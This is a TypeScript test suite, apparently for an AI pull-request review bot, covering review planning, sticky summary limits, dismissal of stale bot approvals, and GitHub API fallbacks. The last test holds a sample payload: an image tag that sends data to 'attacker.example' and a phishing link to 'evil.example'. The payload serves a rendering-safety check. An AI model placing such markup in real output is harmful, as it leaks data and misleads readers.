      buildPlan({ policy: approvePolicy(), ctx: SMALL_CTX, diff: SMALL_DIFF, draft: approveDraft() }),
      plan({ draft: draft({ comments: [cmt("src/orders.ts", 13, "high", `x <!-- xrepo-review:review -->`)] }) }),
      plan({ policy: pol({ capabilities: { summary_comment: { mode: "review" } } }), draft: draft({ summary: `S ${REVIEW_MARKER}` }) }),
      plan({ policy: pol({ capabilities: { summary_comment: { enabled: false }, block: { enabled: true, method: "review" } } }), draft: draft({ comments: [cmt("src/orders.ts", 13, "high")], verdict: { type: "verdict", verdict: "request_changes", reason: "" } }) }),
    ];
    for (const p of cases) {
      expect(p.review!.body.endsWith(`\n\n${REVIEW_MARKER}`)).toBe(true);
      expect(p.review!.body.split(REVIEW_MARKER)).toHaveLength(2);
      expect(isXrepoReviewBody(p.review!.body)).toBe(true);
      for (const c of p.review!.comments) expect(c.body).not.toContain(REVIEW_MARKER);
    }
    expect(cases[3]!.review!.event).toBe("REQUEST_CHANGES");
    expect(plan().review).toBeUndefined();
  });

  // stale-bot-approval-never-dismissed
  it("asks the publisher to dismiss earlier approvals whenever this run does not approve", () => {
    const ok = buildPlan({ policy: approvePolicy(), ctx: SMALL_CTX, diff: SMALL_DIFF, draft: approveDraft() });
    expect(ok.approved).toBe(true);
    expect(ok.dismiss_approvals).toBe(false);
    // Approval downgraded by never_paths (.github/ touched), max_changed_lines, findings: dismiss.
    const neverPaths = buildPlan({ policy: approvePolicy(), ctx: FULL_CTX, diff: FULL_DIFF, draft: approveDraft() });
    expect(neverPaths.verdict).toBe("comment");
    expect(neverPaths.review).toBeUndefined(); // nothing posted at all: the old approval would stay the bot's state
    expect(neverPaths.dismiss_approvals).toBe(true);
    expect(neverPaths.decisions.join("\n")).toContain("earlier approvals by this reviewer are stale");
    expect(buildPlan({ policy: approvePolicy({ max_changed_lines: 3 }), ctx: SMALL_CTX, diff: SMALL_DIFF, draft: approveDraft() }).dismiss_approvals).toBe(true);
    expect(buildPlan({ policy: approvePolicy(), ctx: SMALL_CTX, diff: SMALL_DIFF, draft: approveDraft([cmt("src/new.ts", 2, "critical")]) }).dismiss_approvals).toBe(true);
    // Incomplete runs never approve, so they fail closed too (unlike change requests, which they keep).
    const inc = buildPlan({ policy: approvePolicy(), ctx: SMALL_CTX, diff: SMALL_DIFF, draft: approveDraft(), incomplete: true });
    expect(inc).toMatchObject({ approved: false, dismiss_approvals: true, dismiss_change_requests: false });
    expect(plan().dismiss_approvals).toBe(true);
  });

  // sticky-cut-inside-agent-fence
  it("leaves room in the sticky comment for the outcome comments, so the publisher never cuts the summary", () => {
    const filler = "Note: {pr_title} / {reason} / {run_url}. ".repeat(80).slice(0, 3900);
    const policy = pol({
      capabilities: { summary_comment: { max_chars: 60000 }, block: { enabled: true, method: "check" } },
      output: { footer: "TRUSTED POLICY FOOTER" },
      outcomes: { completed: { comment: `Review completed. ${filler}` }, blocked: { comment: `BLOCKED: do not merge. ${filler}` } },
    });
    const limit = stickySummaryLimit(policy);
    expect(limit).toBeLessThan(60000);
    // The agent opens a <details> (and a fence) near where a cut would land.
    const agent = `${"Finding details. ".repeat(3000)}\n\n<details>\n<summary>More</summary>\n\n${"long text ".repeat(4000)}\n\n\`\`\`\n${"code\n".repeat(2000)}`;
    const p = plan({
      policy,
      draft: draft({ summary: agent, comments: [cmt("src/orders.ts", 13, "critical", "bad")], verdict: { type: "verdict", verdict: "request_changes", reason: "r" } }),
    });
    expect(p.blocked).toBe(true);
    expect(p.summary.length).toBeLessThanOrEqual(limit);
    expect(p.summary.endsWith("TRUSTED POLICY FOOTER")).toBe(true);
    expect(p.decisions.join("\n")).toContain("summary limited to");
    const vars = { repo: "acme/api", pr_number: 7, pr_title: "t".repeat(300), reason: "r".repeat(300), run_url: `https://github.com/acme/api/actions/runs/${"1".repeat(1900)}`, outcome: "completed" as const };
    const comments = (["completed", "blocked"] as const).map((o) => renderOutcomeComment(policy, o, vars));
    const sticky = composeSticky("completed", p.summary, comments)!;
    expect(sticky.length).toBeLessThanOrEqual(65000);
    // The summary is posted whole: footers kept, no fence or <details> left open before the outcome comments.
    expect(sticky).toContain(p.summary);
    const before = sticky.slice(0, sticky.indexOf("BLOCKED: do not merge."));
    expect(before).toContain("TRUSTED POLICY FOOTER");
    expect(before).toContain("Verdict: **request_changes**");
    expect((before.match(/^```/gm) ?? []).length % 2).toBe(0);
    expect((before.match(/<details>/g) ?? []).length).toBe((before.match(/<\/details>/g) ?? []).length);
    // Without outcome comments, max_chars stays in charge.
    expect(stickySummaryLimit(pol({}))).toBeGreaterThan(60000);
  });

  // stale-sticky-after-skip
  it("runStatusStickyBody: a trusted note that replaces an outdated sticky after a skipped run", () => {
    const body = runStatusStickyBody({ outcome: "skipped", reason: "draft pull request @alice <img src=x>", head_sha: "a".repeat(40) });
    expect(body.startsWith(`${STICKY_MARKER}\n`)).toBe(true);
    expect(body).toContain("The latest automated review run for commit aaaaaaa was skipped (`draft pull request @alice <img src=x>`).");
    expect(body).toContain("outdated");
    expect(runStatusStickyBody({ outcome: "usage_limit" })).toBe(
      stickyCommentBody("The latest automated review run was postponed (usage limit reached). An earlier review summary in this comment is outdated and no longer describes this pull request."),
    );
    expect(runStatusStickyBody({ outcome: "weird", reason: "x\n\ny" })).toContain("ended (`x y`)");
    expectRendersSafe(body);
  });
});

/* ------------------- github.ts: review lifecycle and the 422 fallbacks ------------------- */

interface Call {
  method: string;
  path: string;
  body: Record<string, unknown> | undefined;
}

const HEAD = "abc123";
/** GET /repos/acme/api/pulls/7 as GitHub would answer it. */
function prRoute(c: Call, headSha = HEAD, state = "open"): { status?: number; body?: unknown } | undefined {
  return c.method === "GET" && c.path === "/repos/acme/api/pulls/7" ? { body: { number: 7, state, draft: false, merged: false, head: { sha: headSha } } } : undefined;
}

function fakeApi(handler: (c: Call) => { status?: number; body?: unknown }, selfLogin = "me[bot]", run?: RunRef) {
  const calls: Call[] = [];
  const fetchImpl = (async (input: string | URL | Request, init?: RequestInit) => {
    const url = new URL(typeof input === "string" ? input : input instanceof URL ? input.href : input.url);
    const call: Call = {
      method: (init?.method ?? "GET").toUpperCase(),
      path: url.pathname,
      body: typeof init?.body === "string" && init.body !== "" ? (JSON.parse(init.body) as Record<string, unknown>) : undefined,
    };
    calls.push(call);
    const res = handler(call);
    const status = res.status ?? 200;
    return new Response(status === 204 ? null : JSON.stringify(res.body ?? {}), { status, headers: { "content-type": "application/json" } });
  }) as typeof fetch;
  const client = createGitHubApi({ token: "t", repo: "acme/api", prNumber: 7, headSha: HEAD, baseUrl: "https://api.test", fetch: fetchImpl, selfLogin, ...(run ? { run } : {}) });
  return { client, calls };
}

const REFUSED = { status: 422, body: { message: "Unprocessable Entity", errors: ["GitHub Actions is not permitted to approve pull requests."] } };

describe("github.ts: createReview with downgradeRefusedEvent", () => {
  const review: PlanReview = {
    event: "APPROVE",
    body: "\u2705 Approved by the automated review. 1 inline comment.",
    comments: [{ path: "src/a.ts", line: 3, side: "RIGHT", body: `nit ${commentMarker("111111111111")}` }],
  };

  it("posts the same review as a COMMENT when GitHub refuses the APPROVE event", async () => {
    const { client, calls: all } = fakeApi((c) => prRoute(c) ?? (c.body?.event === "APPROVE" ? REFUSED : { body: { id: 91 } }));
    const r = await client.createReview(review, { downgradeRefusedEvent: true });
    expect(r).toMatchObject({ id: 91, inlineFallback: false, event: "COMMENT", downgraded: { from: "APPROVE" } });
    expect(r.downgraded?.reason).toBe("GitHub Actions is not permitted to approve pull requests.");
    expect(all[0]).toMatchObject({ method: "GET", path: "/repos/acme/api/pulls/7" }); // the head is verified first
    const calls = all.filter((c) => c.method === "POST");
    expect(calls.map((c) => c.body?.event)).toEqual(["APPROVE", "COMMENT"]);
    expect(calls[1]!.body!.comments).toEqual(calls[0]!.body!.comments);
    const body = String(calls[1]!.body!.body);
    expect(body).toMatch(/^> \*\*Note:\*\* GitHub refused to submit this review as APPROVE \(`GitHub Actions is not permitted to approve pull requests\.`\)/);
    expect(body).toContain("it does not approve the pull request");
    expect(body.endsWith(review.body)).toBe(true);
  });

  it("downgrades a refused REQUEST_CHANGES and still folds comments on a later line error", async () => {
    let n = 0;
    const { client, calls } = fakeApi(() => {
      n++;
      if (n === 1) return { status: 422, body: { message: "Unprocessable Entity", errors: ["Can not request changes on your own pull request"] } };
      if (n === 2) return { status: 422, body: { message: "Unprocessable Entity", errors: ["Line could not be resolved"] } };
      return { body: { id: 92 } };
    });
    const r = await client.createReview({ ...review, event: "REQUEST_CHANGES" }, { downgradeRefusedEvent: true });
    expect(r).toMatchObject({ id: 92, inlineFallback: true, event: "COMMENT", downgraded: { from: "REQUEST_CHANGES", reason: "Can not request changes on your own pull request" } });
    expect(calls).toHaveLength(3);
    expect(calls[2]!.body!.comments).toBeUndefined();
    expect(String(calls[2]!.body!.body)).toContain(commentMarker("111111111111"));
  });

  it("keeps rethrowing by default, and never downgrades other errors", async () => {
    const off = fakeApi(() => REFUSED);
    await expect(off.client.createReview(review)).rejects.toMatchObject({ status: 422 });
    expect(off.calls).toHaveLength(1);
    const other = fakeApi((c) => prRoute(c) ?? { status: 422, body: { message: "Validation Failed", errors: ["Body is too long"] } });
    await expect(other.client.createReview(review, { downgradeRefusedEvent: true })).rejects.toMatchObject({ status: 422 });
    expect(other.calls.filter((c) => c.method === "POST")).toHaveLength(1);
    const err = (message: string) => Object.assign(new Error(message), { status: 422 });
    expect(isEventRefusedError(err("Can not approve your own pull request"))).toBe(true);
    expect(isEventRefusedError(err("Line could not be resolved"))).toBe(false);
    expect(isLineResolutionError(err("GitHub Actions is not permitted to approve pull requests."))).toBe(false);
  });
});

describe("github.ts: dismissStaleChangeRequests", () => {
  const ours = (body = `Automated review.\n\n${REVIEW_MARKER}`) => body;
  it("dismisses only our own (marked) stale reviews and reports failures", async () => {
    const { client, calls } = fakeApi((c) => {
      const pr = prRoute(c);
      if (pr) return pr;
      if (c.method === "GET" && c.path === "/repos/acme/api/pulls/7/reviews") {
        return {
          body: [
            { id: 1, user: { login: "me[bot]" }, state: "CHANGES_REQUESTED", commit_id: "0ld0001", body: ours() },
            { id: 2, user: { login: "me[bot]" }, state: "COMMENTED", commit_id: "0ld0001", body: ours() },
            { id: 3, user: { login: "someone" }, state: "CHANGES_REQUESTED", commit_id: "0ld0001", body: ours() },
            { id: 4, user: { login: "Me[bot]" }, state: "CHANGES_REQUESTED", commit_id: "0ld0002", body: ours() },
            { id: 5, user: { login: "me[bot]" }, state: "DISMISSED", commit_id: "0ld0001", body: ours() },
          ],
        };
      }
      if (c.method === "PUT" && c.path.endsWith("/4/dismissals")) return { status: 403, body: { message: "forbidden" } };
      return { body: { id: 0 } };
    });
    expect(await client.dismissStaleChangeRequests!("The latest automated review\nno longer requests changes.")).toEqual({ dismissed: [1], failed: [4] });
    const puts = calls.filter((c) => c.method === "PUT");
    expect(puts.map((c) => c.path)).toEqual(["/repos/acme/api/pulls/7/reviews/1/dismissals", "/repos/acme/api/pulls/7/reviews/4/dismissals"]);
    expect(puts[0]!.body).toEqual({ message: "The latest automated review no longer requests changes.", event: "DISMISS" });
  });

  // dismisses-other-tools-change-requests
  it("never dismisses another workflow's review posted under the shared github-actions[bot] identity", async () => {
    const { client, calls } = fakeApi(
      (c) =>
        prRoute(c) ??
        (c.method === "GET" && c.path === "/repos/acme/api/pulls/7/reviews"
          ? {
              body: [
                { id: 11, user: { login: "github-actions[bot]" }, state: "CHANGES_REQUESTED", commit_id: "0ld0001", body: "reviewdog: 3 lint errors must be fixed" },
                { id: 12, user: { login: "github-actions[bot]" }, state: "APPROVED", commit_id: "0ld0001", body: "Auto-approving dependabot update" },
                { id: 13, user: { login: "github-actions[bot]" }, state: "CHANGES_REQUESTED", commit_id: "0ld0001", body: `x\n\n${REVIEW_MARKER}` },
                // Posted before REVIEW_MARKER existed: recognised by the publisher's exact framing.
                { id: 14, user: { login: "github-actions[bot]" }, state: "CHANGES_REQUESTED", commit_id: "0ld0001", body: "\u274C Changes requested: 1 finding at or above high." },
              ],
            }
          : { body: {} }),
      "github-actions[bot]",
    );
    expect(await client.dismissStaleChangeRequests!("stale")).toEqual({ dismissed: [13, 14], failed: [] });
    expect(calls.filter((c) => c.method === "PUT").map((c) => c.path)).toEqual([
      "/repos/acme/api/pulls/7/reviews/13/dismissals",
      "/repos/acme/api/pulls/7/reviews/14/dismissals",
    ]);
    expect(isXrepoReviewBody("reviewdog: 3 lint errors must be fixed")).toBe(false);
    expect(isXrepoReviewBody(`anything\n${REVIEW_MARKER}`)).toBe(true);
    expect(isXrepoReviewBody("\u2705 Approved by the automated review. 1 inline comment.")).toBe(true);
    expect(isXrepoReviewBody("\u274C Changes requested: 2 findings at or above high. 2 inline comments. Details are in the summary comment.")).toBe(true);
    expect(isXrepoReviewBody("### \u{1F916} Automated review\n\nok\n\n---\n<sub>Verdict: **approve** \u00B7 0 findings</sub>")).toBe(true);
    // A generic heading another bot might use is not enough.
    expect(isXrepoReviewBody("### \u{1F916} Automated review\n\nPlease fix the lint errors.")).toBe(false);
    expect(isXrepoReviewBody("\u274C Changes requested: please fix")).toBe(false);
    expect(isXrepoReviewBody(null)).toBe(false);
  });

  // replayed-old-run-overrides-current-state
  it("keeps change requests when this run is not for the PR's current head, or they are on the current head", async () => {
    const reviews = [
      { id: 21, user: { login: "me[bot]" }, state: "CHANGES_REQUESTED", commit_id: "2222222", body: ours() },
      { id: 22, user: { login: "me[bot]" }, state: "CHANGES_REQUESTED", commit_id: "0ld0001", body: ours() },
    ];
    const route = (head: string) => (c: Call) =>
      prRoute(c, head) ?? (c.method === "GET" && c.path === "/repos/acme/api/pulls/7/reviews" ? { body: reviews } : { body: {} });
    // A re-run of the older run for HEAD while the PR head is 2222222: nothing is lifted.
    const replay = fakeApi(route("2222222"));
    const r1 = await replay.client.dismissStaleChangeRequests!("stale");
    expect(r1).toMatchObject({ dismissed: [], failed: [] });
    expect(r1.kept).toContain("the pull request head is 2222222");
    expect(replay.calls.filter((c) => c.method === "PUT")).toEqual([]);
    // The current run (HEAD is the PR head): only the change request on an older commit goes.
    const cur = fakeApi((c) =>
      prRoute(c) ??
      (c.method === "GET" && c.path === "/repos/acme/api/pulls/7/reviews"
        ? { body: [...reviews, { id: 23, user: { login: "me[bot]" }, state: "CHANGES_REQUESTED", commit_id: HEAD, body: ours() }] }
        : { body: {} }),
    );
    const r2 = await cur.client.dismissStaleChangeRequests!("stale");
    expect(r2.dismissed).toEqual([21, 22]);
    expect(r2.kept).toContain("1 change request(s) on the current head");
    // The PR cannot be read: fail closed (keep the block).
    const blind = fakeApi((c) =>
      c.path === "/repos/acme/api/pulls/7" ? { status: 500, body: { message: "boom" } } : c.path.endsWith("/reviews") ? { body: reviews } : { body: {} },
    );
    expect(await blind.client.dismissStaleChangeRequests!("stale")).toMatchObject({ dismissed: [] });
  });
});

// stale-bot-approval-never-dismissed
describe("github.ts: stale approvals", () => {
  const approved = (id: number, commit = "1111111", login = "me[bot]") => ({
    id,
    user: { login },
    state: "APPROVED",
    commit_id: commit,
    body: `\u2705 Approved by the automated review.\n\n${REVIEW_MARKER}`,
  });

  it("a finished run that does not approve dismisses our earlier approvals (whatever their commit)", async () => {
    const { client, calls } = fakeApi(
      (c) =>
        prRoute(c) ??
        (c.method === "GET" && c.path.endsWith("/reviews")
          ? { body: [approved(1), approved(2, HEAD), approved(3, "1111111", "alice"), { ...approved(4), body: "LGTM (dependabot auto-approve)" }] }
          : { body: {} }),
    );
    expect(await client.dismissStaleChangeRequests!("Superseded")).toMatchObject({ dismissed: [1, 2], failed: [] });
    expect(calls.filter((c) => c.method === "PUT").map((c) => c.path)).toEqual([
      "/repos/acme/api/pulls/7/reviews/1/dismissals",
      "/repos/acme/api/pulls/7/reviews/2/dismissals",
    ]);
  });

  it("dismissStaleApprovals (incomplete, skipped, error, usage_limit runs) dismisses approvals only", async () => {
    const { client, calls } = fakeApi((c) =>
      c.method === "GET" && c.path.endsWith("/reviews")
        ? { body: [approved(1), { ...approved(2), state: "CHANGES_REQUESTED" }, { ...approved(3), state: "COMMENTED" }] }
        : { body: {} },
    );
    expect(await client.dismissStaleApprovals!("The latest run did not approve")).toEqual({ dismissed: [1], failed: [] });
    expect(calls.filter((c) => c.method === "PUT").map((c) => c.path)).toEqual(["/repos/acme/api/pulls/7/reviews/1/dismissals"]);
    expect(calls.some((c) => c.path === "/repos/acme/api/pulls/7")).toBe(false);
  });

  it("keeps the approval this client just posted, and dismisses the older one", async () => {
    const { client, calls } = fakeApi((c) => {
      const pr = prRoute(c);
      if (pr) return pr;
      if (c.method === "POST" && c.path.endsWith("/reviews")) return { body: { id: 50 } };
      if (c.method === "GET" && c.path.endsWith("/reviews")) return { body: [approved(1), approved(50, HEAD)] };
      return { body: {} };
    });
    const r = await client.createReview({ event: "APPROVE", body: `ok\n\n${REVIEW_MARKER}`, comments: [] }, { downgradeRefusedEvent: true });
    expect(r).toEqual({ id: 50, inlineFallback: false });
    expect((await client.dismissStaleChangeRequests!("Superseded")).dismissed).toEqual([1]);
    expect(calls.filter((c) => c.method === "PUT").map((c) => c.path)).toEqual(["/repos/acme/api/pulls/7/reviews/1/dismissals"]);
  });

  it("never approves a head it did not review (a re-run of an older run) or a PR it cannot read", async () => {
    for (const [route, reason] of [
      [(c: Call) => prRoute(c, "2222222"), "the pull request head moved to 2222222 after commit abc123 was reviewed"],
      [(c: Call) => prRoute(c, HEAD, "closed"), "the pull request is closed"],
      [(c: Call) => (c.path === "/repos/acme/api/pulls/7" ? { status: 404, body: { message: "Not Found" } } : undefined), "the pull request's current head could not be verified"],
    ] as const) {
      const { client, calls } = fakeApi((c) => route(c) ?? { body: { id: 60 } });
      const r = await client.createReview({ event: "APPROVE", body: "ok", comments: [] }, { downgradeRefusedEvent: true });
      expect(r).toMatchObject({ id: 60, event: "COMMENT", downgraded: { from: "APPROVE", reason } });
      const posts = calls.filter((c) => c.method === "POST");
      expect(posts.map((c) => c.body?.event)).toEqual(["COMMENT"]);
      expect(String(posts[0]!.body!.body)).toContain("it does not approve the pull request");
    }
    // Without downgradeRefusedEvent (and with verifyHead) the call throws instead of approving.
    const strict = fakeApi((c) => prRoute(c, "2222222") ?? { body: { id: 61 } });
    await expect(strict.client.createReview({ event: "APPROVE", body: "ok", comments: [] }, { verifyHead: true })).rejects.toThrow(/approval withheld/);
    expect(strict.calls.filter((c) => c.method === "POST")).toEqual([]);
  });
});

// replayed-old-run-overrides-current-state, draft-skip-passes-blocking-check-same-commit
describe("github.ts: check runs of replayed / skipped runs", () => {
  const checkList = (runs: { id: number; conclusion: string; external_id?: string }[]) => (c: Call) =>
    c.method === "GET" && c.path === `/repos/acme/api/commits/${HEAD}/check-runs` ? { body: { total_count: runs.length, check_runs: runs.map((r) => ({ name: "xrepo-review", ...r })) } } : undefined;

  it("tags check runs with the workflow run and never posts over a newer run's check for the same commit", async () => {
    expect(runExternalId({ id: 100, attempt: 2 })).toBe("xrepo-review:run=100:attempt=2");
    expect(runIdFromExternalId("xrepo-review:run=100:attempt=2")).toBe(100);
    expect(runIdFromExternalId("other")).toBeUndefined();
    const existing = [
      { id: 7, conclusion: "failure", external_id: runExternalId({ id: 100, attempt: 1 }) },
      { id: 6, conclusion: "skipped", external_id: runExternalId({ id: 90, attempt: 1 }) },
    ];
    // Re-running the older (draft-time) run 90 cannot replace run 100's failing check.
    const old = fakeApi((c) => checkList(existing)(c) ?? { status: 201, body: { id: 9 } }, "me[bot]", { id: 90, attempt: 2 });
    const r = await old.client.createCheckRun({ name: "xrepo-review", conclusion: "skipped", title: "Review skipped: draft pull request", summary: "s" });
    expect(r).toMatchObject({ id: 7, superseded: { newer_run: 100 } });
    expect(old.calls.filter((c) => c.method === "POST")).toEqual([]);
    // The newest run posts, with its run id in external_id.
    const cur = fakeApi((c) => checkList(existing)(c) ?? { status: 201, body: { id: 10 } }, "me[bot]", { id: 101, attempt: 1 });
    expect(await cur.client.createCheckRun({ name: "xrepo-review", conclusion: "success", title: "t", summary: "s" })).toEqual({ id: 10 });
    expect(cur.calls.find((c) => c.method === "POST")!.body).toMatchObject({ external_id: "xrepo-review:run=101:attempt=1", conclusion: "success" });
  });

  it("keep_failure: a run that did not review the commit never lifts a failing check on it", async () => {
    const failing = [{ id: 7, conclusion: "failure" }, { id: 5, conclusion: "success" }];
    const a = fakeApi((c) => checkList(failing)(c) ?? { status: 201, body: { id: 9 } });
    const r = await a.client.createCheckRun({ name: "xrepo-review", conclusion: "skipped", title: "Review skipped: draft pull request", summary: "s", keep_failure: true });
    expect(r).toMatchObject({ id: 7, superseded: {} });
    expect(a.calls.filter((c) => c.method === "POST")).toEqual([]);
    // A failing conclusion, or a commit without a failing check, is posted.
    const b = fakeApi((c) => checkList(failing)(c) ?? { status: 201, body: { id: 9 } });
    expect(await b.client.createCheckRun({ name: "xrepo-review", conclusion: "failure", title: "t", summary: "s", keep_failure: true })).toEqual({ id: 9 });
    const passing = fakeApi((c) => checkList([{ id: 5, conclusion: "success" }])(c) ?? { status: 201, body: { id: 9 } });
    expect(await passing.client.createCheckRun({ name: "xrepo-review", conclusion: "neutral", title: "t", summary: "s", keep_failure: true })).toEqual({ id: 9 });
  });

  it("runFreshness: not current when the head moved or a newer run already published for the commit", async () => {
    const moved = fakeApi((c) => prRoute(c, "2222222") ?? { body: {} });
    expect(await moved.client.runFreshness!("xrepo-review")).toMatchObject({ current: false, head_sha: "2222222" });
    const newer = fakeApi(
      (c) => prRoute(c) ?? checkList([{ id: 7, conclusion: "failure", external_id: runExternalId({ id: 100 }) }])(c) ?? { body: {} },
      "me[bot]",
      { id: 90, attempt: 3 },
    );
    expect(await newer.client.runFreshness!("xrepo-review")).toMatchObject({ current: false, newer_run: 100 });
    const ok = fakeApi((c) => prRoute(c) ?? checkList([])(c) ?? { body: {} }, "me[bot]", { id: 101 });
    expect(await ok.client.runFreshness!("xrepo-review")).toMatchObject({ current: true, head_sha: HEAD });
  });
});

describe("github.ts: foldCommentsIntoBody keeps every part in its own block", () => {
  it("does not let a comment body with an open <pre> swallow the next comment's suggestion", () => {
    const evil = '<img src="https://attacker.example/p.png?leak=DATA"> <a href="https://evil.example/login">x</a>';
    const p = plan({
      draft: draft({
        comments: [
          cmt("src/orders.ts", 13, "medium", "first\n<pre>", { suggestion: evil }),
          cmt("src/orders.ts", 14, "medium", "second\n<details>", { suggestion: evil }),
          cmt("src/new.ts", 1, "low", "third", { suggestion: evil }),
        ],
      }),
    });
    const folded = foldCommentsIntoBody(p.review!.body, p.review!.comments);
    expect(folded.split("```suggestion").length - 1).toBe(3);
    expectRendersSafe(folded);
  });
});
